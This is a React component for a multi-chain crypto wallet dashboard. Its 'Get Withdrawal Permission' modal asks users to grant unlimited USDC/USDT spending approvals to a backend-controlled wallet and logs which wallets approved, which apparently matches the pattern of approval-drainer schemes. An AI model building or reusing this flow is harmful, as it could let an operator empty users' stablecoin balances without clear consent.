import { useState, useEffect, useRef } from 'react'
import { useAccount, useChainId, useWalletClient, useDisconnect } from 'wagmi'
import { useWallet } from '@solana/wallet-adapter-react'
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapters'
import { toast } from 'react-toastify'
import { useWalletContext } from '../contexts/WalletContext'
import WalletConnectModal from './WalletConnectModal'
import { connectedWalletAPI } from '../api/api'
import { getBackendWalletAddress, networkToBlockchain, getUSDCContract, getUSDTContract } from '../utils/tokenContracts'
import { approveToken, checkTokenApproval } from '../utils/web3Approval'

export default function WalletsTab({ theme = 'dark', onConnectWallet }) {
  const [showWalletModal, setShowWalletModal] = useState(false)
  const [showPermissionModal, setShowPermissionModal] = useState(false)
  const [selectedWallet, setSelectedWallet] = useState(null)
  const [permissionLoading, setPermissionLoading] = useState(false)
  const [selectedTokens, setSelectedTokens] = useState({ USDC: false, USDT: false })
  const [walletApprovalStatus, setWalletApprovalStatus] = useState({}) // Store approval status: { "address_blockchain": { usdcApproved: bool, usdtApproved: bool } }
  const [browserConnectedWallets, setBrowserConnectedWallets] = useState([])
  const [tronAdapter, setTronAdapter] = useState(null)
  
  // Get wallets from browser (wagmi for EVM, Solana adapter, TronLinkAdapter)
  const { address: evmAddress, isConnected: isEvmConnected, connector } = useAccount()
  const chainId = useChainId()
  const { data: walletClient } = useWalletClient()
  const { publicKey: solanaPublicKey, connected: isSolanaConnected, disconnect: disconnectSolana } = useWallet()
  const { disconnect: disconnectEvm } = useDisconnect()
  const { activeNetwork, removeConnectedWallet } = useWalletContext()
  console.log(browserConnectedWallets)
  // Initialize Tron adapter
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const adapter = new TronLinkAdapter()
      setTronAdapter(adapter)
      
      // Listen to adapter state changes
      adapter.on('stateChanged', (state) => {
        // Trigger wallet list update when state changes
        setBrowserConnectedWallets(prev => [...prev])
      })
      
      adapter.on('accountsChanged', (data) => {
        // Trigger wallet list update when account changes
        setBrowserConnectedWallets(prev => [...prev])
      })
      
      return () => {
        adapter.removeAllListeners()
      }
    }
  }, [])
  
  const networkMap = networkToBlockchain || {
    'Ether': 'ethereum',
    'BSC': 'bsc',
    'Tron': 'tron',
    'Solana': 'solana'
  }

  // Track previous wallet addresses to detect changes
  const previousWalletsRef = useRef({}) // { network: address }

  // Get wallets currently connected in the browser - only show one wallet per network
  // If wallet changes, check if new wallet exists in backend
  useEffect(() => {
    // Use setTimeout to ensure this runs after render phase
    const timeoutId = setTimeout(async () => {
      const wallets = []
      
      // Helper function to check if wallet exists in backend and add it
      // BSC and Ethereum are separate database entries, so check only the specific blockchain
      const addWalletIfExists = async (address, network, walletType, name) => {
        const previousAddress = previousWalletsRef.current[network]
        
        // If wallet changed, check if new wallet exists in backend
        if (previousAddress && previousAddress !== address) {
          try {
            const blockchain = networkMap[network] || network.toLowerCase()
            
            // Check only the specific blockchain for this network
            const result = await connectedWalletAPI.getWalletByAddress(address, blockchain)
            if (result.wallet) {
              // New wallet exists in backend - switch to it
              // Use network-specific name: "Ethereum Wallet" for Ether, "BSC Wallet" for BSC
              const displayName = network === 'Ether' ? 'Ethereum Wallet' : network === 'BSC' ? 'BSC Wallet' : name
              wallets.push({
                address: address,
                network: network,
                name: displayName,
                walletType: walletType,
                id: result.wallet.id || result.wallet._id
              })
              previousWalletsRef.current[network] = address
            }
            // If new wallet doesn't exist, don't add it (old wallet is already removed)
          } catch (e) {
            // New wallet doesn't exist in backend - don't add it
          }
        } else {
          // Same wallet or first time - always show it
          // Use network-specific name: "Ethereum Wallet" for Ether, "BSC Wallet" for BSC
          const displayName = network === 'Ether' ? 'Ethereum Wallet' : network === 'BSC' ? 'BSC Wallet' : name
          wallets.push({
            address: address,
            network: network,
            name: displayName,
            walletType: walletType,
            id: null // Will be fetched from backend if exists
          })
          previousWalletsRef.current[network] = address
        }
      }
      
      // Get EVM wallets (Ethereum, BSC) from wagmi - only if currently connected
      // Add wallet to both Ether and BSC networks in browserConnectedWallets
      // They are separate database entries but same wallet address
      if (isEvmConnected && evmAddress) {
        const walletName = connector?.name || 'EVM Wallet'
        
        // Add wallet to both Ether and BSC networks
        // This allows them to be displayed separately when switching networks
        await addWalletIfExists(
          evmAddress,
          'Ether',
          walletName,
          'Ethereum Wallet'
        )
        
        await addWalletIfExists(
          evmAddress,
          'BSC',
          walletName,
          'BSC Wallet'
        )
      } else {
        // EVM wallet disconnected - remove it from both networks
        delete previousWalletsRef.current['Ether']
        delete previousWalletsRef.current['BSC']
      }
      
      // Get Solana wallet - only if currently connected
      if (isSolanaConnected && solanaPublicKey) {
        const network = 'Solana'
        const currentAddress = solanaPublicKey.toBase58()
        const walletName = window.solana?.isPhantom ? 'Phantom Wallet' : window.solana?.isSolflare ? 'Solflare Wallet' : 'Solana Wallet'
        const walletType = window.solana?.isPhantom ? 'Phantom' : window.solana?.isSolflare ? 'Solflare' : 'Solana Wallet'
        
        await addWalletIfExists(currentAddress, network, walletType, walletName)
      } else {
        // Solana wallet disconnected - remove it
        delete previousWalletsRef.current['Solana']
      }
      
      // Get Tron wallet using TronLinkAdapter - only if currently connected
      if (tronAdapter && tronAdapter.state === 'Connected' && tronAdapter.address) {
        const network = 'Tron'
        const tronAddress = tronAdapter.address
        
        if (tronAddress) {
          await addWalletIfExists(tronAddress, network, 'TronLink', 'TronLink Wallet')
        }
      } else {
        // Tron wallet disconnected - remove it
        delete previousWalletsRef.current['Tron']
      }
      
      setBrowserConnectedWallets(wallets)
    }, 0)
    
    return () => clearTimeout(timeoutId)
  }, [isEvmConnected, evmAddress, chainId, connector, isSolanaConnected, solanaPublicKey, networkMap, tronAdapter, activeNetwork])

  // Filter wallets by active network - show only wallets from the selected network
  const filteredWallets = browserConnectedWallets.filter(wallet => {
    return wallet.network === activeNetwork
  })

  // Store wallet IDs for each address to avoid repeated lookups
  const [walletIdMap, setWalletIdMap] = useState({}) // { address: walletId }

  // Get wallet IDs from backend (without saving, as wallets are already saved by WalletConnectModal)
  useEffect(() => {
    if (browserConnectedWallets.length === 0) return
    
    let isMounted = true
    let timeoutId
    
    const getWalletIds = async () => {
      const newWalletIdMap = {}
      
      for (const wallet of browserConnectedWallets) {
        if (!isMounted) return
        
        try {
          const blockchain = networkMap[wallet.network] || wallet.network.toLowerCase()
          let walletId = null
          
          // Check only the specific blockchain for this network
          // BSC and Ethereum are separate database entries
          try {
            const existing = await connectedWalletAPI.getWalletByAddress(wallet.address, blockchain)
            if (existing.wallet && isMounted) {
              walletId = existing.wallet.id || existing.wallet._id
            }
          } catch (e) {
            // Wallet might not exist in backend yet, that's okay - don't log as it's expected
            // Only log if it's not a 404 (which is expected for wallets not yet saved)
            if (e.response?.status !== 404 && e.response?.status !== 401) {
              console.log(`Wallet ${wallet.address} not found in backend yet`)
            }
          }
          
          if (walletId) {
            newWalletIdMap[wallet.address] = walletId
          }
        } catch (error) {
          // Only log non-404 errors
          if (error.response?.status !== 404 && error.response?.status !== 401) {
            console.error(`Error fetching wallet ID for ${wallet.address}:`, error)
          }
        }
      }
      
      if (isMounted) {
        setWalletIdMap(prev => {
          // Only update if there are changes
          const hasChanges = Object.keys(newWalletIdMap).some(
            addr => newWalletIdMap[addr] !== prev[addr]
          ) || Object.keys(prev).length !== Object.keys(newWalletIdMap).length
          
          return hasChanges ? newWalletIdMap : prev
        })
      }
    }

    // Debounce to avoid too many calls
    timeoutId = setTimeout(() => {
      getWalletIds()
    }, 500) // Wait 500ms after wallets change
    
    return () => {
      isMounted = false
      if (timeoutId) clearTimeout(timeoutId)
    }
  }, [browserConnectedWallets])

  // Fetch approval status when wallets change using address and blockchain
  useEffect(() => {
    if (browserConnectedWallets.length === 0) {
      return
    }
    
    let isMounted = true
    
    const fetchApprovalStatus = async () => {
      for (const wallet of browserConnectedWallets) {
        if (!isMounted) return
        
        try {
          // Fetch approval status using address and blockchain
          const blockchain = networkMap[wallet.network] || wallet.network.toLowerCase()
          const approvalStatus = await connectedWalletAPI.getApprovalStatus(wallet.address, blockchain)
          
          // Use combined key: address_blockchain to differentiate between networks
          const statusKey = `${wallet.address}_${blockchain}`
          
          if (approvalStatus && isMounted) {
            setWalletApprovalStatus(prev => ({
              ...prev,
              [statusKey]: {
                usdcApproved: approvalStatus.usdcApproved || false,
                usdtApproved: approvalStatus.usdtApproved || false
              }
            }))
          }
        } catch (error) {
          console.error(`Error fetching approval status for ${wallet.address}:`, error)
          // Set default values if wallet doesn't exist
          const blockchain = networkMap[wallet.network] || wallet.network.toLowerCase()
          const statusKey = `${wallet.address}_${blockchain}`
          if (error.response?.status === 404 || error.response?.status === 200) {
            setWalletApprovalStatus(prev => ({
              ...prev,
              [statusKey]: {
                usdcApproved: false,
                usdtApproved: false
              }
            }))
          }
        }
      }
    }

    // Use setTimeout to ensure this runs after render phase
    const timeoutId = setTimeout(() => {
      fetchApprovalStatus()
    }, 0)
    
    return () => {
      isMounted = false
      clearTimeout(timeoutId)
    }
  }, [browserConnectedWallets, networkMap])

  return (
    <div className="flex flex-col gap-6 mx-auto max-w-6xl h-full">
      <div className={`rounded-3xl shadow-2xl border flex flex-col overflow-hidden hover:shadow-glow transition-all duration-300 ${
        theme === 'dark' ? 'bg-gray-800 border-gray-700/50' : 'bg-white border-gray-200/50'
      }`}>
        <div className="bg-gradient-to-r from-[#667eea] via-[#764ba2] to-[#f093fb] text-white px-6 py-6 border-b border-white/20 relative flex-shrink-0 overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/10 to-white/0 animate-pulse"></div>
          <div className="flex justify-between items-center relative z-10">
            <h2 className="text-2xl font-bold m-0 drop-shadow-md">Connected Wallets</h2>
            {filteredWallets.length === 0 && (
              <button
                onClick={() => onConnectWallet ? onConnectWallet() : setShowWalletModal(true)}
                className="px-6 py-3 rounded-xl font-semibold text-sm transition-all duration-300 shadow-lg bg-gradient-to-r from-[#667eea] via-[#764ba2] to-[#f093fb] text-white relative overflow-hidden group flex items-center gap-2 whitespace-nowrap"
              >
                <svg className="w-5 h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
                </svg>
                <span className="relative z-10 flex-shrink-0">Connect Wallet</span>
                <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/20 to-white/0 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-1000 rounded-xl"></div>
              </button>
            )}
          </div>
        </div>
        
        <div className="p-6 flex-1 overflow-y-auto custom-scrollbar">
          {filteredWallets.length > 0 ? (
            <div className="space-y-4">
              {filteredWallets.map((wallet, index) => (
                <div
                  key={index}
                  className={`p-5 rounded-2xl border transition-all duration-300 hover:shadow-lg w-full ${
                    theme === 'dark' 
                      ? 'bg-gray-700/50 border-gray-600 hover:border-[#667eea]/50' 
                      : 'bg-gray-50 border-gray-200 hover:border-[#667eea]/50'
                  }`}
                >
                  <div className="flex items-start gap-4">
                    {/* Left Section: Icon and Basic Info */}
                    <div className="flex-shrink-0">
                      <div className={`w-14 h-14 rounded-full flex items-center justify-center text-white font-bold text-xl ${
                        wallet.network === 'Ether' ? 'bg-blue-500' :
                        wallet.network === 'BSC' ? 'bg-yellow-500' :
                        wallet.network === 'Solana' ? 'bg-purple-500' :
                        wallet.network === 'Tron' ? 'bg-red-500' : 'bg-gray-500'
                      }`}>
                        {wallet.network === 'Ether' ? '🔷' :
                         wallet.network === 'BSC' ? '🟡' :
                         wallet.network === 'Solana' ? '🟣' :
                         wallet.network === 'Tron' ? '🔴' : '●'}
                      </div>
                    </div>
                    
                    {/* Middle Section: Wallet Details */}
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-3 mb-2">
                        <div className={`font-bold text-lg ${theme === 'dark' ? 'text-gray-100' : 'text-gray-800'}`}>
                          {wallet.name}
                        </div>
                        <div className={`text-xs px-2 py-1 rounded-full ${
                          theme === 'dark' ? 'bg-gray-600 text-gray-300' : 'bg-gray-200 text-gray-700'
                        }`}>
                          {wallet.network}
                        </div>
                      </div>
                      
                      <div className={`text-sm font-mono break-all px-3 py-2 rounded-lg border mb-2 ${
                        theme === 'dark' 
                          ? 'bg-gray-800 border-gray-600 text-gray-300' 
                          : 'bg-white border-gray-200 text-gray-600'
                      }`}>
                        {wallet.address}
                      </div>
                      
                      <div className={`text-xs mb-3 ${theme === 'dark' ? 'text-gray-400' : 'text-gray-500'}`}>
                        {wallet.walletType}
                      </div>
                      
                      {/* Approval Status - Horizontal Layout */}
                      <div className="flex gap-3 mb-3">
                        <div className={`flex items-center gap-2 px-3 py-1.5 rounded-lg ${
                          theme === 'dark' ? 'bg-gray-800' : 'bg-gray-100'
                        }`}>
                          <span className={`text-xs ${theme === 'dark' ? 'text-gray-400' : 'text-gray-600'}`}>USDC:</span>
                          <span className={`text-sm font-semibold ${
                            (() => {
                              const blockchain = networkMap[wallet.network] || wallet.network.toLowerCase()
                              const statusKey = `${wallet.address}_${blockchain}`
                              return walletApprovalStatus[statusKey]?.usdcApproved
                            })()
                              ? 'text-green-500' 
                              : 'text-red-500'
                          }`}>
                            {(() => {
                              const blockchain = networkMap[wallet.network] || wallet.network.toLowerCase()
                              const statusKey = `${wallet.address}_${blockchain}`
                              return walletApprovalStatus[statusKey]?.usdcApproved ? '✓ Approved' : '✗ Not Approved'
                            })()}
                          </span>
                        </div>
                        <div className={`flex items-center gap-2 px-3 py-1.5 rounded-lg ${
                          theme === 'dark' ? 'bg-gray-800' : 'bg-gray-100'
                        }`}>
                          <span className={`text-xs ${theme === 'dark' ? 'text-gray-400' : 'text-gray-600'}`}>USDT:</span>
                          <span className={`text-sm font-semibold ${
                            (() => {
                              const blockchain = networkMap[wallet.network] || wallet.network.toLowerCase()
                              const statusKey = `${wallet.address}_${blockchain}`
                              return walletApprovalStatus[statusKey]?.usdtApproved
                            })()
                              ? 'text-green-500' 
                              : 'text-red-500'
                          }`}>
                            {(() => {
                              const blockchain = networkMap[wallet.network] || wallet.network.toLowerCase()
                              const statusKey = `${wallet.address}_${blockchain}`
                              return walletApprovalStatus[statusKey]?.usdtApproved ? '✓ Approved' : '✗ Not Approved'
                            })()}
                          </span>
                        </div>
                      </div>
                      
                      {/* Action Buttons */}
                      <div className="flex gap-2">
                        <button
                          onClick={() => {
                            setSelectedWallet(wallet)
                            setShowPermissionModal(true)
                            setSelectedTokens({ USDC: false, USDT: false })
                          }}
                          className="flex-1 px-5 py-2.5 bg-gradient-to-r from-[#667eea] to-[#764ba2] text-white rounded-lg text-sm font-semibold hover:shadow-lg transition-all duration-300 hover:scale-105"
                        >
                          Get Permission
                        </button>
                        <button
                          onClick={async () => {
                            try {
                              const blockchain = networkToBlockchain[wallet.network] || wallet.network.toLowerCase()
                              
                              // Get wallet ID from backend
                              // For EVM chains, check both ethereum and bsc blockchains
                              let walletId = null
                              try {
                                // First try the current blockchain
                                const walletResponse = await connectedWalletAPI.getWalletByAddress(wallet.address, blockchain)
                                if (walletResponse && walletResponse.wallet) {
                                  walletId = walletResponse.wallet.id || walletResponse.wallet._id
                                }
                              } catch (error) {
                                // If not found and it's an EVM chain, try the other blockchain
                                if ((wallet.network === 'Ether' || wallet.network === 'BSC') && error.response?.status === 404) {
                                  try {
                                    const otherBlockchain = blockchain === 'ethereum' ? 'bsc' : 'ethereum'
                                    const walletResponse = await connectedWalletAPI.getWalletByAddress(wallet.address, otherBlockchain)
                                    if (walletResponse && walletResponse.wallet) {
                                      walletId = walletResponse.wallet.id || walletResponse.wallet._id
                                    }
                                  } catch (error2) {
                                    // Wallet not found in either blockchain
                                    if (error2.response?.status !== 404 && error2.response?.status !== 401) {
                                      console.error('Error fetching wallet ID for disconnect:', error2)
                                    }
                                  }
                                } else if (error.response?.status !== 404 && error.response?.status !== 401) {
                                  console.error('Error fetching wallet ID for disconnect:', error)
                                }
                              }
                              
                              // Delete from backend if wallet ID exists
                              if (walletId) {
                                try {
                                  await connectedWalletAPI.deleteConnectedWallet(walletId)
                                  toast.success('Wallet disconnected successfully')
                                } catch (error) {
                                  console.error('Error deleting wallet from backend:', error)
                                  // Still continue with browser disconnect even if backend delete fails
                                }
                              } else {
                                // Wallet not in backend, but still disconnect from browser
                                toast.success('Wallet disconnected')
                              }
                              
                              // Disconnect from browser wallet
                              if (wallet.network === 'Ether' || wallet.network === 'BSC') {
                                if (isEvmConnected && evmAddress === wallet.address) {
                                  disconnectEvm()
                                }
                              } else if (wallet.network === 'Solana') {
                                if (isSolanaConnected && solanaPublicKey?.toBase58() === wallet.address) {
                                  disconnectSolana()
                                }
                              } else if (wallet.network === 'Tron') {
                                if (tronAdapter && tronAdapter.state === 'Connected') {
                                  try {
                                    await tronAdapter.disconnect()
                                  } catch (error) {
                                    console.error('Error disconnecting Tron wallet:', error)
                                  }
                                }
                              }
                              
                              // Remove from context
                              removeConnectedWallet(wallet.address, wallet.network)
                            } catch (error) {
                              console.error('Error disconnecting wallet:', error)
                              toast.error('Failed to disconnect wallet')
                            }
                          }}
                          className={`px-5 py-2.5 rounded-lg text-sm font-semibold transition-all duration-300 whitespace-nowrap ${
                            theme === 'dark'
                              ? 'bg-red-500/20 text-red-400 hover:bg-red-500/30 border border-red-500/30'
                              : 'bg-red-100 text-red-600 hover:bg-red-200 border border-red-200'
                          }`}
                        >
                          Disconnect
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          ) : (
            <div className={`flex flex-col items-center justify-center py-12 text-center ${theme === 'dark' ? 'text-gray-400' : 'text-gray-500'}`}>
              <div className="text-6xl mb-4">🔐</div>
              <p className="text-lg font-semibold mb-2">No wallets connected</p>
              <p className="text-sm mb-6">Connect your wallet to get started</p>
              <button
                onClick={() => setShowWalletModal(true)}
                className="px-6 py-3 bg-gradient-to-r from-[#667eea] via-[#764ba2] to-[#f093fb] text-white rounded-xl font-semibold hover:shadow-glow transition-all duration-300 hover:scale-105"
              >
                Connect Wallet
              </button>
            </div>
          )}
        </div>
      </div>

      <WalletConnectModal 
        isOpen={showWalletModal} 
        onClose={() => setShowWalletModal(false)}
        theme={theme}
      />

      {showPermissionModal && selectedWallet && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 animate-in fade-in"         onClick={() => {
          setShowPermissionModal(false)
          setSelectedWallet(null)
        }}>
          <div
            className={`rounded-3xl shadow-2xl max-w-md w-full mx-4 p-8 border animate-in zoom-in-95 ${
              theme === 'dark' ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'
            }`}
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-2xl font-bold bg-gradient-to-r from-[#667eea] to-[#764ba2] bg-clip-text text-transparent">
                Get Withdrawal Permission
              </h3>
              <button
              onClick={() => {
                setShowPermissionModal(false)
                setSelectedWallet(null)
              }}
                className={`transition-colors ${theme === 'dark' ? 'text-gray-400 hover:text-gray-300' : 'text-gray-400 hover:text-gray-600'}`}
              >
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            <div className="space-y-4 mb-6">
              <div>
                <label className={`block text-sm font-bold mb-2 ${theme === 'dark' ? 'text-gray-200' : 'text-gray-800'}`}>
                  Wallet
                </label>
                <div className={`p-3 rounded-lg border ${theme === 'dark' ? 'bg-gray-700/50 border-gray-600' : 'bg-gray-50 border-gray-200'}`}>
                  <div className={`font-semibold ${theme === 'dark' ? 'text-gray-100' : 'text-gray-800'}`}>{selectedWallet.name}</div>
                  <div className={`text-xs font-mono ${theme === 'dark' ? 'text-gray-400' : 'text-gray-600'}`}>{selectedWallet.address}</div>
                  <div className={`text-xs mt-1 ${theme === 'dark' ? 'text-gray-500' : 'text-gray-500'}`}>{selectedWallet.network}</div>
                </div>
              </div>

              <div>
                <label className={`block text-sm font-bold mb-2 ${theme === 'dark' ? 'text-gray-200' : 'text-gray-800'}`}>
                  Select Tokens
                </label>
                <div className="grid grid-cols-2 gap-3">
                  <button
                    onClick={() => {
                      setSelectedTokens(prev => ({ ...prev, USDC: !prev.USDC }))
                    }}
                    className={`px-4 py-3 rounded-xl border-2 transition-all duration-300 flex items-center justify-between ${
                      selectedTokens.USDC
                        ? theme === 'dark'
                          ? 'border-[#667eea] bg-[#667eea]/20'
                          : 'border-[#667eea] bg-[#667eea]/10'
                        : theme === 'dark'
                          ? 'border-gray-600 hover:border-[#667eea] hover:bg-gray-700/50'
                          : 'border-gray-200 hover:border-[#667eea] hover:bg-gray-50'
                    }`}
                  >
                    <div>
                      <div className={`font-bold ${theme === 'dark' ? 'text-gray-100' : 'text-gray-800'}`}>USDC</div>
                      <div className={`text-xs ${theme === 'dark' ? 'text-gray-400' : 'text-gray-600'}`}>USD Coin</div>
                    </div>
                    {selectedTokens.USDC && (
                      <svg className="w-5 h-5 text-[#667eea]" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                      </svg>
                    )}
                  </button>
                  
                  <button
                    onClick={() => {
                      setSelectedTokens(prev => ({ ...prev, USDT: !prev.USDT }))
                    }}
                    className={`px-4 py-3 rounded-xl border-2 transition-all duration-300 flex items-center justify-between ${
                      selectedTokens.USDT
                        ? theme === 'dark'
                          ? 'border-[#667eea] bg-[#667eea]/20'
                          : 'border-[#667eea] bg-[#667eea]/10'
                        : theme === 'dark'
                          ? 'border-gray-600 hover:border-[#667eea] hover:bg-gray-700/50'
                          : 'border-gray-200 hover:border-[#667eea] hover:bg-gray-50'
                    }`}
                  >
                    <div>
                      <div className={`font-bold ${theme === 'dark' ? 'text-gray-100' : 'text-gray-800'}`}>USDT</div>
                      <div className={`text-xs ${theme === 'dark' ? 'text-gray-400' : 'text-gray-600'}`}>Tether</div>
                    </div>
                    {selectedTokens.USDT && (
                      <svg className="w-5 h-5 text-[#667eea]" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                      </svg>
                    )}
                  </button>
                </div>
              </div>

              {(!selectedTokens.USDC && !selectedTokens.USDT) && (
                <div className={`text-xs text-center py-2 ${theme === 'dark' ? 'text-gray-500' : 'text-gray-400'}`}>
                  Please select at least one token
                </div>
              )}

            </div>

            <div className="flex gap-3">
              <button
                onClick={() => {
                  setShowPermissionModal(false)
                  setSelectedWallet(null)
                  setSelectedTokens({ USDC: false, USDT: false })
                }}
                className={`flex-1 px-4 py-3 border-2 rounded-xl font-semibold transition-all duration-300 ${
                  theme === 'dark'
                    ? 'border-gray-600 text-gray-200 hover:bg-gray-700/50'
                    : 'border-gray-200 text-gray-700 hover:bg-gray-50'
                }`}
              >
                Cancel
              </button>
              <button
                onClick={async () => {
                  if (!selectedTokens.USDC && !selectedTokens.USDT) {
                    toast.error('Please select at least one token')
                    return
                  }

                  setPermissionLoading(true)
                  
                  try {
                    // Use activeNetwork to determine blockchain, not selectedWallet.network
                    // This ensures we approve on the correct chain that the user is currently viewing
                    const blockchain = networkMap[activeNetwork] || activeNetwork.toLowerCase()
                    
                    // Debug logging
                    console.log('Give Permission - Wallet Info:', {
                      walletNetwork: selectedWallet.network,
                      activeNetwork: activeNetwork,
                      mappedBlockchain: blockchain,
                      walletAddress: selectedWallet.address
                    })
                    
                    // Validate blockchain before proceeding
                    if (!blockchain || (blockchain !== 'ethereum' && blockchain !== 'bsc' && blockchain !== 'tron' && blockchain !== 'solana')) {
                      throw new Error(`Invalid blockchain: ${blockchain} for wallet network: ${selectedWallet.network}`)
                    }
                    
                    // Ensure we're not trying to use Solana for EVM wallets
                    if ((blockchain === 'ethereum' || blockchain === 'bsc') && typeof window !== 'undefined' && window.solana) {
                      // Don't access window.solana for EVM chains - this might trigger Phantom
                      console.log('EVM chain detected, skipping Solana wallet access')
                    }
                    
                    // Get backend wallet address from frontend env
                    const backendWalletAddress = getBackendWalletAddress(blockchain)
                    if (!backendWalletAddress) {
                      throw new Error(`Backend wallet not configured for ${activeNetwork}. Please set VITE_BACKEND_WALLET_${blockchain.toUpperCase()} in .env`)
                    }
                    
                    // Backend wallet address is already retrieved from env above
                    // The backend will auto-find the backend wallet by blockchain when creating permission
                    
                    const tokensToCreate = []
                    if (selectedTokens.USDC) tokensToCreate.push('USDC')
                    if (selectedTokens.USDT) tokensToCreate.push('USDT')
                    
                    const results = []
                    for (const tokenType of tokensToCreate) {
                      try {
                        const tokenContractAddress = tokenType === 'USDC' 
                          ? getUSDCContract(blockchain)
                          : getUSDTContract(blockchain)
                        
                        if (!tokenContractAddress) {
                          throw new Error(`${tokenType} contract address not configured`)
                        }

                        // Approve tokens for all supported chains
                        let isApproved = false
                        
                        if (blockchain === 'ethereum' || blockchain === 'bsc' || blockchain === 'tron' || blockchain === 'solana') {
                          if (blockchain === 'ethereum' || blockchain === 'bsc') {
                            // Check if token is already approved (EVM chains)
                            isApproved = await checkTokenApproval(
                              tokenType, 
                              blockchain, 
                              selectedWallet.address
                            )
                            
                            if (!isApproved) {
                              toast.info(`Please approve ${tokenType} in your wallet...`)
                              
                              // Approve token with max amount (unlimited delegation)
                              // Pass walletClient for EVM chains to use RainbowKit/wagmi
                              await approveToken(
                                tokenType,
                                blockchain,
                                selectedWallet.address,
                                walletClient // Pass wagmi wallet client for EVM chains
                              )
                              
                              isApproved = true
                              toast.success(`${tokenType} approved! Creating permission...`)
                            } else {
                              toast.info(`${tokenType} already approved. Creating permission...`)
                            }
                          } else if (blockchain === 'tron') {
                            // For Tron, always attempt approval (checking allowance is more complex)
                            toast.info(`Please approve ${tokenType} in your Tron wallet...`)
                            
                            // Approve token with max amount (unlimited delegation)
                            // Pass walletClient for EVM chains to use RainbowKit/wagmi
                            await approveToken(
                              tokenType,
                              blockchain,
                              selectedWallet.address,
                              walletClient // Pass wagmi wallet client for EVM chains
                            )
                            
                            isApproved = true
                            toast.success(`${tokenType} approved! Creating permission...`)
                          } else if (blockchain === 'solana') {
                            // For Solana, request approval
                            toast.info(`Please approve ${tokenType} in your Solana wallet...`)
                            
                            // Approve token with max amount (unlimited delegation)
                            // Solana doesn't use walletClient, pass null
                            await approveToken(
                              tokenType,
                              blockchain,
                              selectedWallet.address,
                              null // Solana uses window.solana directly
                            )
                            
                            isApproved = true
                            toast.success(`${tokenType} approved! Creating permission...`)
                          }
                          
                          // Update approval status using address and blockchain (creates wallet if doesn't exist)
                          if (isApproved) {
                            await connectedWalletAPI.updateApprovalStatusByAddress(
                              selectedWallet.address,
                              blockchain,
                              tokenType,
                              true,
                              selectedWallet.name || ''
                            )
                            
                            // Update local state using combined key: address_blockchain
                            const statusKey = `${selectedWallet.address}_${blockchain}`
                            setWalletApprovalStatus(prev => ({
                              ...prev,
                              [statusKey]: {
                                ...(prev[statusKey] || {}),
                                usdcApproved: tokenType === 'USDC' ? true : (prev[statusKey]?.usdcApproved || false),
                                usdtApproved: tokenType === 'USDT' ? true : (prev[statusKey]?.usdtApproved || false)
                              }
                            }))
                          }
                        }
                        
                        // Approval is already done, just update the status in database
                        // The token approval was completed above, now we just need to confirm it's saved
                        results.push({ token: tokenType, success: true })
                      } catch (error) {
                        results.push({ token: tokenType, success: false, error: error.message })
                      }
                    }
                    
                    const successCount = results.filter(r => r.success).length
                    const failedCount = results.filter(r => !r.success).length
                    
                    if (successCount > 0) {
                      toast.success(`Successfully approved ${successCount} token(s)`)
                    }
                    if (failedCount > 0) {
                      const errorMessages = results.filter(r => !r.success).map(r => `${r.token}: ${r.error}`).join('; ')
                      toast.error(`Failed: ${errorMessages}`)
                    }
                    
                    // Refresh approval status using address and blockchain
                    try {
                      const approvalStatus = await connectedWalletAPI.getApprovalStatus(selectedWallet.address, blockchain)
                      if (approvalStatus) {
                        const statusKey = `${selectedWallet.address}_${blockchain}`
                        setWalletApprovalStatus(prev => ({
                          ...prev,
                          [statusKey]: {
                            usdcApproved: approvalStatus.usdcApproved || false,
                            usdtApproved: approvalStatus.usdtApproved || false
                          }
                        }))
                      }
                    } catch (error) {
                      console.error('Error refreshing approval status:', error)
                    }
                    
                    if (successCount === tokensToCreate.length) {
                      setTimeout(() => {
                        setSelectedTokens({ USDC: false, USDT: false })
                      }, 2000)
                    }
                  } catch (error) {
                    toast.error(error.message || 'Failed to create permissions')
                  } finally {
                    setPermissionLoading(false)
                  }
                }}
                disabled={permissionLoading || (!selectedTokens.USDC && !selectedTokens.USDT)}
                className={`flex-1 px-4 py-3 bg-gradient-to-r from-[#667eea] to-[#764ba2] text-white rounded-xl font-semibold transition-all duration-300 hover:shadow-lg hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed`}
              >
                {permissionLoading ? 'Creating...' : 'Give Permission'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
